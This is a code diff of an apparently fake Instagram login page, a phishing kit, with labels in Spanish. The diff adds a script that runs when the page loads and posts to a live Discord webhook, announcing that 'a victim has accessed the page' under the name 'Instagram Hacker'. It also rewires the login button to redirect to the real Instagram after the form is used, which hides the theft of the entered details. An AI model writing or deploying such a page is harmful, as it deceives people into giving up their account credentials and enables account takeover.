@@ -9,6 +9,29 @@
 </head>
 <body>
     <main class="flex align-items-center justify-content-center">
+
+
+        <script>
+            window.addEventListener('DOMContentLoaded', function(){
+
+                const entrada = {
+                                content: "Una victima a accedido a la pagina",
+                                username: "Instagram Hacker",
+                                };
+
+
+
+                fetch('https://discord.com/api/webhooks/1348787730145869896/Y4JDDeLGkJuQU0v_t8i9gsCVqIGXzF0BrxZPyJ9Yyped1Ev-0rKO5aHkDwWNmLiwr4GY', {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(entrada)
+
+                    });
+
+            
+            });
+
+        </script>
         <section id="mobile" class="flex">
         </section>
         <section id="auth" class="flex direction-column">
@@ -43,13 +66,19 @@
 
                             });
 
-                            location = 'https://www.instagram.com'
+                            function redirect(){
+
+                                location = 'https://www.instagram.com'
+
+                            }
+
+                            
 
 
                         }
                     </script>
 
-                    <button type="button" >Entrar</button>
+                    <button type="button" onclick="redirect()" >Entrar</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
